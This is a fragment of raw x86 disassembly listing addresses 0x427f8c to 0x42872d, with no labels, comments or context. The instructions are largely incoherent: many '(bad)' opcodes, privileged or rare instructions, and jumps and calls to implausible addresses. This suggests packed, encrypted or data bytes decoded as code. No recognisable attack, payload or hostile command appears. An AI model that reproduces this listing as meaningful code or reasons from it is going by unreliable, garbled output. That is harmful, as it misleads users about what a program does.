  427f8c:	(bad)  
  427f8d:	mov    BYTE PTR [edi+0xf723b11],ch
  427f93:	add    ch,ch
  427f95:	inc    ebp
  427f96:	dec    DWORD PTR [ebx-0x34332775]
  427f9c:	add    al,0x4d
  427f9e:	inc    ebp
  427f9f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  427fa5:	cwde   
  427fa6:	add    DWORD PTR [edx],esi
  427fa8:	add    BYTE PTR [ebx+0x4d00c000],cl
  427fae:	push   DWORD PTR [ebx]
  427fb0:	int3   
  427fb1:	xor    eax,DWORD PTR [eax]
  427fb3:	add    edx,DWORD PTR [eax+0x3]
  427fb6:	mov    DWORD PTR [edi],ecx
  427fb8:	call   0x4288407e
  427fbd:	mov    DWORD PTR [ebp-0x20],esp
  427fc0:	add    BYTE PTR [ebp+0x7d],al
  427fc3:	mov    eax,DWORD PTR [eax]
  427fc5:	in     al,0x15
  427fc7:	ret    
  427fc8:	iret   
  427fc9:	(bad)  
  427fca:	enter  0x14af,0x8b
  427fce:	(bad)  
  427fcf:	in     al,dx
  427fd0:	or     bl,cl
  427fd2:	adc    cl,al
  427fd4:	push   ebp
  427fd5:	dec    ebp
  427fd6:	inc    eax
  427fd7:	mov    edx,DWORD PTR [ebp-0x20]
  427fda:	jb     0x427fa7
  427fdc:	mov    ecx,esi
  427fde:	cld    
  427fdf:	scas   eax,DWORD PTR es:[edi]
  427fe0:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  427fe7:	mov    BYTE PTR [eax],0x8c
  427fea:	push   0xffffff98
  427fec:	push   edi
  427fed:	xor    dl,BYTE PTR [eax+0x3b]
  427ff0:	mov    ecx,DWORD PTR [edi]
  427ff2:	call   0x8c41c555
  427ff7:	mov    eax,eax
  427ff9:	in     al,dx
  427ffa:	jge    0x428049
  427ffc:	mov    DWORD PTR [ebx],esi
  427ffe:	int3   
  427fff:	add    eax,DWORD PTR [ebp+0xf]
  428002:	xor    eax,ecx
  428004:	(bad)  
  428005:	dec    ebp
  428006:	pushf  
  428007:	xor    ecx,eax
  428009:	add    edi,DWORD PTR [edi]
  42800b:	mov    eax,DWORD PTR [ebp-0x38]
  42800e:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  428015:	mov    DWORD PTR [edx+0xf4505c8],ecx
  42801b:	xor    edx,DWORD PTR [ecx+edi*4]
  42801e:	or     BYTE PTR [ebp-0x371600bd],0xf
  428025:	dec    ebp
  428026:	leave  
  428027:	mov    edx,ecx
  428029:	rol    BYTE PTR [ebp+0x330155],1
  42802f:	add    ecx,DWORD PTR [ebp+0xf]
  428032:	xor    eax,edx
  428034:	(bad)  
  428035:	ror    DWORD PTR [eax],0x86
  428038:	jb     0x428037
  42803a:	add    bh,bh
  42803c:	clc    
  42803d:	inc    ebp
  42803e:	jb     0x4280aa
  428040:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  428046:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  42804c:	shr    BYTE PTR [eax-0x3d],0x30
  428050:	clc    
  428051:	add    BYTE PTR [ebp+0x75],al
  428054:	cmp    BYTE PTR [edx-0x64],ch
  428057:	inc    edi
  428059:	adc    al,0xe8
  42805b:	inc    ebp
  42805c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  428062:	mov    ecx,DWORD PTR [eax]
  428064:	cld    
  428065:	or     DWORD PTR [ebp-0x34],0x33
  428069:	jbe    0x42806e
  42806b:	mov    edx,DWORD PTR [ecx+0x2b]
  42806e:	dec    ebp
  42806f:	mov    cl,BYTE PTR [ebx+0x45d801]
  428075:	mov    BYTE PTR [ebx],dh
  428077:	mov    eax,DWORD PTR [ebx]
  428079:	or     BYTE PTR [ecx+0x3b],dl
  42807c:	dec    ebp
  42807d:	int3   
  42807e:	xor    ebp,edi
  428080:	add    eax,DWORD PTR [ebp+0x51]
  428083:	mov    ecx,DWORD PTR [ebp-0x28]
  428086:	xor    eax,DWORD PTR [eax]
  428088:	add    ebp,DWORD PTR [eax+0x51]
  42808b:	adc    BYTE PTR [eax+0x0],0x8b
  42808f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  428095:	inc    ebp
  428096:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  42809c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4280a2:	dec    ebp
  4280a3:	mov    esi,DWORD PTR [ebx]
  4280a5:	hlt    
  4280a6:	add    eax,ebx
  4280a8:	push   ecx
  4280a9:	inc    ebp
  4280aa:	dec    ebp
  4280ab:	sar    bh,1
  4280ad:	shl    ah,1
  4280af:	(bad)  
  4280b0:	retf   
  4280b1:	mov    al,ds:0xc5ff3dce
  4280b6:	adc    al,0xc6
  4280b8:	inc    ebp
  4280b9:	and    eax,0x9c0f4c85
  4280be:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4280c5:	cmp    BYTE PTR [ebx+0x3b],0x0
  4280c9:	mov    dh,0xc7
  4280cb:	cmp    eax,eax
  4280cd:	jne    0x45437919
  4280d3:	mov    edi,DWORD PTR [edx]
  4280d5:	mov    eax,0x848bcb9c
  4280da:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  4280e1:	or     BYTE PTR [edi],cl
  4280e3:	(bad)  
  4280e4:	dec    ebp
  4280e5:	inc    edi
  4280e6:	add    bh,0x50
  4280e9:	or     cl,ch
  4280eb:	test   DWORD PTR [eax+0x4d4501f8],ecx
  4280f1:	xchg   DWORD PTR [eax-0x1638af64],eax
  4280f7:	mov    esp,0xf802b588
  4280fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280fd:	inc    ebp
  4280fe:	(bad)  
  4280ff:	cmp    al,0xff
  428101:	pushf  
  428102:	or     DWORD PTR [ecx+0x45ffe474],0x0
  428109:	mov    ecx,DWORD PTR [ebp-0x340018]
  42810f:	into   
  428110:	dec    DWORD PTR [ebx-0x7f72431c]
  428116:	push   0x5000ff01
  42811b:	retf   
  42811c:	inc    ebp
  42811d:	into   
  42811e:	dec    DWORD PTR [ebx-0x343f3ff4]
  428124:	push   eax
  428125:	into   
  428126:	call   0x4a85b6
  42812b:	retf   
  42812c:	add    dh,cl
  42812e:	add    bh,bh
  428130:	mov    DWORD PTR [eax+ecx*1],edx
  428133:	clc    
  428134:	inc    ebp
  428135:	inc    ebp
  428136:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  42813c:	push   0x1
  42813e:	push   edi
  42813f:	add    BYTE PTR [eax-0x35],dl
  428142:	mov    ecx,esi
  428144:	cld    
  428145:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  42814b:	into   
  42814c:	ror    BYTE PTR [ebx+0x75000800],0x50
  428153:	xor    eax,DWORD PTR [ebp+0x3]
  428156:	jne    0x4281a9
  428158:	call   DWORD PTR [eax-0x3c]
  42815b:	mov    DWORD PTR [ecx-0x18],edx
  42815e:	mov    edi,edi
  428160:	call   0x8b45c6e9
  428165:	add    ah,ah
  428167:	rol    BYTE PTR [ebp-0x7c],0xeb
  42816b:	add    edi,edi
  42816d:	add    al,ch
  42816f:	inc    ebp
  428170:	push   ecx
  428171:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  428177:	mov    al,0xc7
  428179:	test   esp,esp
  42817b:	clc    
  42817c:	test   DWORD PTR [ebp-0x8],ecx
  42817f:	add    BYTE PTR [ebp+0x50],0x39
  428183:	jmp    0x8bcc0a24
  428188:	in     al,dx
  428189:	or     BYTE PTR [ebp-0xf],al
  42818c:	xor    eax,DWORD PTR [eax+0x4f896803]
  428192:	hlt    
  428193:	mov    eax,DWORD PTR [ebp-0x50]
  428196:	xor    esi,ecx
  428198:	add    eax,DWORD PTR [eax+0x4f086889]
  42819e:	inc    ebp
  42819f:	sbb    eax,0x68
  4281a2:	pushf  
  4281a3:	inc    edi
  4281a5:	add    al,ch
  4281a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281a8:	test   edi,edi
  4281aa:	clc    
  4281ab:	inc    DWORD PTR [ebp-0x73]
  4281ae:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  4281b2:	(bad)  
  4281b3:	push   ecx
  4281b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281b5:	jne    0x42813c
  4281b7:	push   eax
  4281b8:	clc    
  4281b9:	test   DWORD PTR [ebp-0x1],eax
  4281bc:	cmp    eax,0xc78b9cff
  4281c1:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  4281c8:	inc    ebp
  4281c9:	push   edi
  4281ca:	aas    
  4281cb:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  4281d2:	dec    ebp
  4281d3:	add    BYTE PTR [ebx],dh
  4281d5:	inc    ebp
  4281d6:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  4281dc:	enter  0x8401,0x0
  4281e0:	add    al,BYTE PTR [eax]
  4281e2:	add    bh,bh
  4281e4:	out    dx,eax
  4281e5:	sbb    BYTE PTR [eax],al
  4281e7:	dec    ebp
  4281e8:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  4281ee:	sub    esi,DWORD PTR [ebx]
  4281f0:	mov    ebp,DWORD PTR [eax-0x8]
  4281f3:	add    bl,0x0
  4281f6:	(bad)  
  4281f7:	cmp    eax,ecx
  4281f9:	or     BYTE PTR [edx+0x750114],al
  4281ff:	inc    DWORD PTR [ebp+0x18]
  428202:	mov    eax,DWORD PTR [ebp-0x8]
  428205:	mov    ebx,eax
  428207:	(bad)  
  428208:	retf   
  428209:	inc    ebp
  42820a:	into   
  42820b:	mov    esi,eax
  42820d:	int3   
  42820e:	scas   eax,DWORD PTR es:[edi]
  42820f:	push   es
  428210:	mov    esi,DWORD PTR [ebp-0xc]
  428213:	call   DWORD PTR [ebp+0x18]
  428216:	sub    edi,DWORD PTR [ebp+0x3b]
  428219:	mov    esi,DWORD PTR [edi-0x34]
  42821c:	mov    eax,DWORD PTR [ebp-0x8]
  42821f:	cmp    bl,al
  428221:	pushf  
  428222:	mov    bh,0xbc
  428225:	fadd   QWORD PTR [eax]
  428227:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  42822d:	mov    esi,DWORD PTR [ebx]
  42822f:	in     al,0x33
  428231:	ret    
  428232:	add    eax,esi
  428234:	add    eax,DWORD PTR [ebp+0xf]
  428237:	mov    eax,ecx
  428239:	in     al,0x4d
  42823b:	ret    
  42823c:	mov    eax,esi
  42823e:	in     al,dx
  42823f:	inc    ebp
  428240:	rol    edi,1
  428242:	sar    al,1
  428244:	or     BYTE PTR [ebp+0x45e9f845],al
  42824a:	add    BYTE PTR [edx],bh
  42824c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  428253:	test   ebx,eax
  428255:	clc    
  428256:	retf   
  428257:	inc    ebp
  428258:	into   
  428259:	cmp    al,0xc6
  42825b:	pushf  
  42825c:	scas   eax,DWORD PTR es:[edi]
  42825d:	(bad)  
  42825e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  428265:	inc    ebp
  428266:	cmp    edi,DWORD PTR [esi]
  428268:	ja     0x428206
  42826a:	mov    eax,edi
  42826c:	mov    esp,0x458567a8
  428271:	clc    
  428272:	mov    eax,DWORD PTR [ebp-0x8]
  428275:	mov    eax,ebx
  428277:	in     al,dx
  428278:	retf   
  428279:	ret    
  42827a:	into   
  42827b:	mov    dh,0x7d
  42827e:	scas   eax,DWORD PTR es:[edi]
  42827f:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  428285:	add    BYTE PTR [ebx],ch
  428287:	jmp    0xb983c7
  42828c:	mov    eax,DWORD PTR [ebp-0x5c]
  42828f:	mov    eax,DWORD PTR [ebp-0x14]
  428292:	inc    ebp
  428293:	enter  0x458b,0xf8
  428297:	xor    eax,ebx
  428299:	add    ecx,ebx
  42829b:	cmp    ecx,esi
  42829d:	shufps xmm7,xmm4,0xaf
  4282a1:	add    BYTE PTR [ebx+0x55e8f48b],cl
  4282a7:	dec    ebp
  4282a8:	sub    esi,DWORD PTR [ebx]
  4282aa:	cmp    esi,DWORD PTR [ebx]
  4282ac:	ja     0x4282b1
  4282ae:	mov    eax,DWORD PTR [ebx]
  4282b0:	lods   al,BYTE PTR ds:[esi]
  4282b1:	mov    db0,ecx
  4282b4:	inc    ebp
  4282b5:	dec    ebp
  4282b6:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  4282bc:	retf   
  4282bd:	rol    dh,1
  4282bf:	or     al,0xce
  4282c1:	inc    ebp
  4282c2:	scas   eax,DWORD PTR es:[edi]
  4282c3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  4282c9:	add    BYTE PTR [ebx],ch
  4282cb:	add    BYTE PTR [ebx],bh
  4282cd:	inc    ebp
  4282ce:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  4282d4:	inc    ebp
  4282d5:	retf   
  4282d6:	mov    ecx,esi
  4282d8:	clc    
  4282d9:	(bad)  
  4282da:	retf   
  4282db:	scas   eax,DWORD PTR es:[edi]
  4282dc:	ret    
  4282dd:	mov    ecx,esi
  4282df:	hlt    
  4282e0:	(bad)  
  4282e1:	push   ebp
  4282e2:	scas   eax,DWORD PTR es:[edi]
  4282e3:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  4282e9:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  4282ef:	add    BYTE PTR [ebx],al
  4282f1:	mov    eax,eax
  4282f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4282f4:	inc    ebp
  4282f5:	dec    ebp
  4282f6:	cmp    BYTE PTR [ebx],dh
  4282f8:	pushf  
  4282f9:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  4282ff:	(bad)  
  428301:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  428309:	sar    eax,1
  42830b:	rol    BYTE PTR [ebp+0x5],1
  42830e:	xor    eax,DWORD PTR [ebp+0x3]
  428311:	jmp    0x4282fe
  428313:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  428319:	xor    eax,DWORD PTR [ebp+0x33]
  42831c:	mov    eax,DWORD PTR [ebx]
  42831e:	rol    BYTE PTR [ebx],1
  428320:	test   BYTE PTR [edi],cl
  428322:	cwde   
  428323:	shl    DWORD PTR [edx],0x4d
  428326:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  42832c:	xor    edx,eax
  42832e:	add    eax,DWORD PTR ds:0xeb4d45e0
  428334:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  42833a:	add    BYTE PTR [ebx],dh
  42833c:	inc    ebp
  42833d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  428343:	rdpmc  
  428345:	rol    DWORD PTR [ebx],0x4d
  428348:	loopne 0x4282d5
  42834a:	push   ebp
  42834b:	in     al,dx
  42834c:	mov    cl,dl
  42834e:	adc    eax,edx
  428350:	jb     0x428357
  428352:	add    BYTE PTR [ebp+0x45],al
  428355:	jmp    0x4282e2
  428357:	mov    ebx,eax
  428359:	test   al,0xcb
  42835b:	dec    ebp
  42835c:	dec    ebp
  42835d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  428363:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  428369:	dec    ebp
  42836a:	mov    al,0x8b
  42836c:	dec    ebp
  42836d:	in     al,dx
  42836e:	xor    edx,ecx
  428370:	xor    edx,eax
  428372:	add    eax,DWORD PTR [ebp+0x3]
  428375:	jbe    0x428386
  428377:	mov    eax,ecx
  428379:	test   al,0x45
  42837b:	dec    ebp
  42837c:	mov    DWORD PTR [ebx],esi
  42837e:	loopne 0x4283b3
  428380:	inc    ebp
  428381:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  428387:	rol    esi,0x45
  42838a:	scas   eax,DWORD PTR es:[edi]
  42838b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  428391:	mov    eax,ecx
  428393:	hlt    
  428394:	dec    ebp
  428395:	inc    ebp
  428396:	mov    eax,edi
  428398:	loopne 0x428372
  42839a:	retf   
  42839b:	test   esi,ecx
  42839d:	clc    
  42839e:	scas   eax,DWORD PTR es:[edi]
  42839f:	inc    ebp
  4283a0:	mov    eax,edi
  4283a2:	fdiv   st,st(0)
  4283a4:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  4283aa:	cwde   
  4283ab:	cmp    dh,BYTE PTR [edx]
  4283ad:	pushf  
  4283ae:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  4283b4:	inc    esi
  4283b6:	mov    ebp,DWORD PTR [eax-0x10]
  4283b9:	inc    ebp
  4283ba:	dec    ebp
  4283bb:	xor    esi,DWORD PTR [ebx]
  4283bd:	add    eax,DWORD PTR [ebx]
  4283bf:	loopne 0x4283d0
  4283c1:	dec    ebp
  4283c2:	ror    DWORD PTR [edx+0x7233084d],0x3
  4283c9:	add    BYTE PTR [ebx-0x7b740bbb],cl
  4283cf:	lock cwde 
  4283d1:	ret    
  4283d2:	xor    al,BYTE PTR [ebp-0x77]
  4283d5:	mov    esi,esp
  4283d7:	rol    BYTE PTR [ebp-0x7c],1
  4283da:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  4283e0:	call   edi
  4283e2:	enter  0x4d45,0x8b
  4283e6:	mov    esi,eax
  4283e8:	fmul   st(3),st
  4283ea:	push   ebp
  4283eb:	dec    ebp
  4283ec:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  4283f2:	ret    0xc198
  4283f5:	xor    al,BYTE PTR [esi-0x280276]
  4283fb:	dec    ebp
  4283fc:	jne    0x428431
  4283fe:	mov    eax,DWORD PTR [ebx]
  428400:	cld    
  428401:	loopne 0x4283b3
  428403:	push   ebp
  428404:	add    DWORD PTR [eax+0x72851100],ecx
  42840a:	inc    DWORD PTR [eax]
  42840c:	inc    DWORD PTR [ebp-0x75]
  42840f:	mov    edi,esp
  428411:	lock add bl,0x1
  428415:	retf   
  428416:	add    dh,al
  428418:	xor    dh,cl
  42841a:	inc    ebp
  42841b:	scas   eax,DWORD PTR es:[edi]
  42841c:	mov    eax,DWORD PTR [ebx]
  42841e:	shl    al,0x0
  428421:	inc    ebp
  428422:	dec    DWORD PTR [ebx+0x4dccf0ff]
  428428:	call   0x459660
  42842d:	ud0    eax,ecx
  428430:	adc    al,0x4d
  428432:	inc    ebp
  428433:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  428439:	lock push 0x338055
  42843f:	add    eax,DWORD PTR [eax]
  428441:	ud0    ecx,edx
  428444:	sbb    BYTE PTR [ebp+0x5e],dl
  428447:	xor    ecx,ecx
  428449:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  428450:	push   ecx
  428451:	add    BYTE PTR [ebp-0x38],cl
  428454:	mov    DWORD PTR [esi-0x740004],eax
  42845a:	cld    
  42845b:	inc    ebp
  42845c:	xchg   edx,eax
  42845d:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  428463:	xabort 0xaf
  428466:	icebp  
  428467:	mov    esi,DWORD PTR [ebp-0x28]
  42846a:	(bad)  
  42846b:	retf   
  42846c:	or     ecx,eax
  42846e:	(bad)  
  42846f:	dec    ebp
  428470:	pop    es
  428471:	(bad)  
  428472:	(bad)  
  428473:	or     BYTE PTR [esi],al
  428475:	jb     0x42843d
  428477:	add    BYTE PTR [ebx],al
  428479:	inc    ebp
  42847a:	(bad)  
  42847b:	mov    ecx,DWORD PTR [edx]
  42847d:	fadd   st(6),st
  42847f:	ret    
  428480:	add    ch,BYTE PTR [eax-0x37]
  428483:	int    0x55
  428485:	sub    ebp,esp
  428487:	add    edx,DWORD PTR [ecx-0x14]
  42848a:	inc    ebp
  42848b:	inc    ebp
  42848c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  428492:	cld    
  428493:	(bad)  
  428494:	mov    gs,WORD PTR [edi+0xf893be0]
  42849a:	mov    ebp,ebp
  42849c:	clc    
  42849d:	push   eax
  42849f:	push   DWORD PTR [ebp-0x4]
  4284a2:	mov    BYTE PTR [ebp+0xa],0xff
  4284a6:	(bad)  
  4284a7:	int3   
  4284a8:	or     BYTE PTR [eax],al
  4284aa:	(bad)  
  4284ab:	lea    eax,[edi]
  4284ad:	ins    BYTE PTR es:[edi],dx
  4284ae:	(bad)  
  4284af:	inc    DWORD PTR [ecx]
  4284b1:	push   eax
  4284b2:	mov    BYTE PTR [ebp+0x9],0x8b
  4284b6:	leave  
  4284b7:	les    edx,FWORD PTR [ebp+0x0]
  4284ba:	in     al,dx
  4284bb:	call   DWORD PTR [ecx-0x75]
  4284be:	inc    ebp
  4284bf:	cld    
  4284c0:	mov    DWORD PTR [eax+0x8b01fc],eax
  4284c6:	cld    
  4284c7:	xor    BYTE PTR [edi-0x76a8f98b],bh
  4284cd:	std    
  4284ce:	mov    eax,DWORD PTR [eax]
  4284d0:	clc    
  4284d1:	test   eax,esi
  4284d3:	je     0x42854a
  4284d5:	mov    eax,esi
  4284d7:	cld    
  4284d8:	add    al,0x80
  4284da:	add    WORD PTR [ecx+0x0],ax
  4284de:	fadd   QWORD PTR [eax]
  4284e0:	mov    BYTE PTR [eax],0xd0
  4284e3:	push   0xffffffc3
  4284e5:	push   edi
  4284e6:	mov    edx,DWORD PTR [eax+0x51]
  4284e9:	pop    edi
  4284ea:	lea    ebx,[ebx-0x8]
  4284ed:	ret    0x45
  4284f0:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  4284f6:	xchg   eax,edi
  4284f8:	mov    DWORD PTR [ebp-0x75],ecx
  4284fb:	push   esi
  4284fc:	clc    
  4284fd:	jne    0x4284cf
  4284ff:	mov    ecx,0xf8450b0b
  428504:	(bad)  
  428505:	push   cs
  428506:	or     BYTE PTR [ebp-0x3a],dh
  428509:	cmp    eax,DWORD PTR [ecx]
  42850b:	pop    esi
  42850c:	(bad)  
  42850d:	or     al,0x5
  42850f:	inc    eax
  428510:	leave  
  428511:	in     al,dx
  428512:	add    al,0x42
  428514:	push   esi
  428515:	and    eax,0xedc940cf
  42851a:	inc    DWORD PTR [eax-0x75]
  42851d:	fmul   QWORD PTR [ebx-0xf8739be]
  428523:	inc    eax
  428524:	nop
  428525:	jmp    0x518b:0x8b8bc3ff
  42852c:	(bad)  
  42852d:	lea    eax,ds:0xff45e8f8
  428533:	push   esi
  428534:	push   DWORD PTR [ebp-0x39]
  428537:	mov    eax,0x7edda46
  42853c:	or     al,0x6
  42853e:	push   DWORD PTR [ebp-0x3a]
  428541:	cmp    eax,DWORD PTR [edx]
  428543:	pop    esi
  428544:	ret    
  428545:	or     al,0x56
  428547:	inc    ecx
  428548:	push   ebp
  428549:	js     0x428537
  42854b:	inc    edx
  42854c:	inc    ebp
  42854d:	int    0x1
  42854f:	inc    ecx
  428550:	sub    BYTE PTR ds:0xe77541fc,ah
  428556:	add    DWORD PTR [edx+0x1c],eax
  428559:	int3   
  42855a:	mov    eax,ebx
  42855c:	adc    al,0x8b
  42855e:	xchg   edx,eax
  42855f:	push   ecx
  428560:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  428566:	rcl    DWORD PTR [esi-0x9],cl
  428569:	jne    0x4285bb
  42856b:	mov    eax,0x7c80ece
  428570:	rol    DWORD PTR [esi],cl
  428572:	div    DWORD PTR [ebp+0x50]
  428575:	cmp    ecx,edx
  428577:	pop    esi
  428578:	dec    BYTE PTR [edx]
  42857a:	in     al,dx
  42857b:	inc    edx
  42857c:	sub    ebp,ecx
  42857e:	inc    eax
  42857f:	(bad)  
  428580:	push   eax
  428581:	add    edx,DWORD PTR [eax-0x17]
  428584:	push   edi
  428585:	add    dh,dh
  428587:	leave  
  428588:	adc    DWORD PTR [ebp-0x1],0xffffffec
  42858c:	add    BYTE PTR [ecx+0x0],dl
  42858f:	inc    ebp
  428590:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  428596:	add    BYTE PTR [eax-0x7fbf448],bh
  42859c:	add    al,0x2
  42859e:	jmp    0x57e30f8
  4285a3:	jne    0x42858d
  4285a5:	mov    eax,DWORD PTR [edx]
  4285a7:	or     BYTE PTR [eax],al
  4285a9:	inc    ecx
  4285aa:	stc    
  4285ab:	in     eax,dx
  4285ac:	ss inc eax
  4285ae:	aas    
  4285af:	out    0x7d,eax
  4285b1:	inc    ecx
  4285b2:	mov    esi,ecx
  4285b4:	lock ret 0x7d
  4285b8:	and    ecx,DWORD PTR [ebx-0x171777]
  4285be:	add    bh,bh
  4285c0:	aad    0xd7
  4285c2:	add    dh,cl
  4285c4:	clts   
  4285c6:	(bad)  
  4285c7:	call   0xffcd84cc
  4285cc:	hlt    
  4285cd:	iret   
  4285ce:	jge    0x4285a6
  4285d0:	rol    DWORD PTR [esi-0x80],cl
  4285d3:	icebp  
  4285d4:	or     BYTE PTR [edi-0x27],cl
  4285d7:	(bad)  
  4285d8:	out    dx,al
  4285d9:	mov    eax,DWORD PTR [ebx]
  4285db:	(bad)  
  4285dc:	pop    esi
  4285dd:	push   es
  4285de:	cmp    al,0xe8
  4285e0:	sar    edi,0x8
  4285e3:	inc    DWORD PTR [edi]
  4285e5:	inc    esi
  4285e6:	(bad)  
  4285e7:	jmp    0x8b00:0x530e577e
  4285ee:	push   esi
  4285ef:	mov    eax,DWORD PTR [eax]
  4285f1:	and    al,0x0
  4285f3:	inc    ebp
  4285f4:	push   eax
  4285f5:	push   eax
  4285f6:	add    DWORD PTR [ebx+0x757d1834],ecx
  4285fc:	sub    edx,DWORD PTR [esi-0x24]
  4285ff:	jne    0x4285b7
  428601:	lods   eax,DWORD PTR ds:[esi]
  428602:	mov    edx,DWORD PTR [edx-0x34]
  428605:	dec    esi
  428606:	out    0x83,eax
  428608:	into   
  428609:	push   edi
  42860b:	loopne 0x4285db
  42860d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  428611:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  428618:	rol    DWORD PTR [edx],0x8
  42861b:	mov    esp,ecx
  42861d:	cmp    DWORD PTR [ebx],0xc
  428620:	mov    esi,0x5001c0
  428625:	push   eax
  428626:	push   cs
  428627:	push   eax
  428628:	(bad)  
  428629:	sub    edx,edi
  42862b:	push   esi
  42862c:	adc    al,0xcb
  42862e:	ins    DWORD PTR es:[edi],dx
  42862f:	mov    eax,0x203e8
  428634:	add    al,ah
  428636:	ror    BYTE PTR [eax+0xc007c0],0xc0
  42863d:	add    dh,al
  42863f:	add    ah,ch
  428641:	rol    DWORD PTR [ebx-0x3595fb0d],1
  428647:	pop    ecx
  428648:	or     eax,ebx
  42864a:	cli    
  42864b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  428651:	lea    ebp,[ebx]
  428653:	mov    edx,DWORD PTR [edx-0x4]
  428656:	dec    ecx
  428657:	inc    ebp
  428658:	shr    BYTE PTR [ebx],0x4b
  42865b:	and    al,0x0
  42865d:	(bad)  
  42865e:	jne    0x4286a5
  428660:	pop    eax
  428661:	mov    al,0x5a
  428663:	call   0x14188c2
  428668:	and    al,0x85
  42866a:	push   edx
  42866b:	add    BYTE PTR [eax+eax*1+0x0],ah
  42866f:	dec    ebp
  428670:	mov    cl,0x23
  428672:	jmp    0x428660
  428674:	mov    al,0xe7
  428676:	call   0x1388964
  42867b:	shr    DWORD PTR [eax+ebx*2],cl
  42867e:	lock (bad) 
  428680:	adc    eax,0x757f008d
  428685:	out    0x58,eax
  428687:	cmp    al,0x7
  428689:	pop    edx
  42868a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  428691:	push   ecx
  428692:	cld    
  428693:	mov    esi,0x3b0175
  428698:	and    al,0xb0
  42869a:	xor    BYTE PTR [edx+0x1],0x8b
  42869e:	add    ah,bh
  4286a0:	mov    edi,DWORD PTR [ebp-0x4]
  4286a3:	psubsw mm7,QWORD PTR [edi]
  4286a6:	add    DWORD PTR [ebp+0x0],ebp
  4286a9:	rcr    eax,1
  4286ab:	mov    edi,ecx
  4286ad:	and    eax,DWORD PTR [eax]
  4286af:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  4286b5:	call   0x12f899e
  4286ba:	add    al,cl
  4286bc:	mov    ebp,esi
  4286be:	aam    0x83
  4286c0:	or     DWORD PTR [ecx],eax
  4286c2:	jne    0x4286b5
  4286c4:	mov    eax,DWORD PTR [eax]
  4286c6:	aam    0x0
  4286c8:	dec    ebp
  4286c9:	jne    0x428656
  4286cb:	cmp    ebx,eax
  4286cd:	jb     0x42871c
  4286cf:	jmp    0x42865c
  4286d1:	mov    ebx,esp
  4286d3:	int3   
  4286d4:	dec    ebp
  4286d5:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  4286dc:	mov    edx,0x8b0a8b
  4286e1:	cmp    ecx,DWORD PTR [eax]
  4286e3:	jb     0x4286bc
  4286e5:	pop    edx
  4286e6:	push   edi
  4286e7:	cli    
  4286e8:	pop    es
  4286e9:	mov    eax,ecx
  4286eb:	jb     0x4286ef
  4286ed:	add    DWORD PTR [ebx],0xa
  4286f0:	mov    eax,DWORD PTR [ebx]
  4286f2:	int3   
  4286f3:	add    bh,BYTE PTR [esi+0x75d10006]
  4286f9:	jmp    0x428686
  4286fb:	mov    al,0xe8
  4286fd:	call   0x103897f
  428702:	add    edx,DWORD PTR [ecx+ecx*8]
  428705:	pop    edi
  428706:	or     BYTE PTR [ecx-0x73],bl
  428709:	pop    ecx
  42870a:	inc    edi
  42870b:	xor    al,0xeb
  42870d:	push   ecx
  42870e:	mov    edi,DWORD PTR [edx+0xc506cc]
  428714:	call   0xb18819
  428719:	int3   
  42871a:	sbb    BYTE PTR [esi],ch
  42871c:	inc    ebp
  42871d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  428723:	call   0x9b8992
  428728:	or     BYTE PTR [ebx-0x73],dl
  42872b:	cmp    al,0x47
  42872d:	mov    al,0x1
